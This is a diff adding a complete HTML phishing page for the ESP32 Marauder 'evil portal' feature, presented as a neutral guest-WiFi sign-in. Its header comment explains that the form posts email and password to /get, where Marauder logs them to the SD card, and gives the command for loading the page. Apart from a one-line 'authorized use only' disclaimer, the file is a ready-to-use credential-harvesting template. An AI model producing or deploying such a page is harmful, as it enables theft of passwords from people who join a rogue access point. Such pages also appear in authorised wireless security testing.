@@ -1,0 +1,49 @@
+<!-- generic_guest_wifi.html -- NEUTRAL guest-WiFi captive portal for ESP32 Marauder.
+     Does NOT impersonate any real company. Self-contained, ~3 KB (well under the
+     20 KB budget). Form POSTs to /get with email/password so Marauder logs creds
+     to evil_portal_x.log on SD. Rename to index.html on the SD root, or select
+     with `evilportal -c sethtml generic_guest_wifi.html`.
+     AUTHORIZED USE ONLY -- own networks or explicit written permission. -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Guest WiFi</title>
+<style>
+  * { box-sizing: border-box; }
+  body { margin:0; font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
+         background:#0f172a; color:#e2e8f0; display:flex; min-height:100vh; align-items:center; justify-content:center; }
+  .card { width:100%; max-width:360px; margin:16px; background:#1e293b; border-radius:14px;
+          padding:28px 24px; box-shadow:0 12px 40px rgba(0,0,0,.45); }
+  .icon { width:48px; height:48px; display:block; margin:0 auto 10px; }
+  h1 { font-size:20px; text-align:center; margin:0 0 4px; }
+  p.sub { text-align:center; color:#94a3b8; font-size:13px; margin:0 0 22px; }
+  label { display:block; font-size:12px; color:#cbd5e1; margin:0 0 6px; }
+  input { width:100%; padding:11px 12px; margin:0 0 16px; border-radius:8px; border:1px solid #334155;
+          background:#0f172a; color:#f1f5f9; font-size:15px; }
+  input:focus { outline:none; border-color:#38bdf8; }
+  button { width:100%; padding:12px; border:0; border-radius:8px; background:#38bdf8; color:#082f49;
+           font-size:15px; font-weight:600; cursor:pointer; }
+  .fine { text-align:center; color:#64748b; font-size:11px; margin:16px 0 0; }
+</style>
+</head>
+<body>
+  <div class="card">
+    <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" stroke-width="2" stroke-linecap="round">
+      <path d="M5 12.55a11 11 0 0 1 14 0"></path><path d="M8.5 16.1a6 6 0 0 1 7 0"></path>
+      <path d="M2 8.82a15 15 0 0 1 20 0"></path><line x1="12" y1="20" x2="12" y2="20"></line>
+    </svg>
+    <h1>Guest WiFi Access</h1>
+    <p class="sub">Sign in to connect to the network</p>
+    <form method="POST" action="/get">
+      <label for="email">Email</label>
+      <input id="email" type="email" name="email" autocomplete="username" required>
+      <label for="password">Password</label>
+      <input id="password" type="password" name="password" autocomplete="current-password" required>
+      <button type="submit">Connect</button>
+    </form>
+    <p class="fine">By connecting you agree to the acceptable-use policy.</p>
+  </div>
+</body>
+</html>
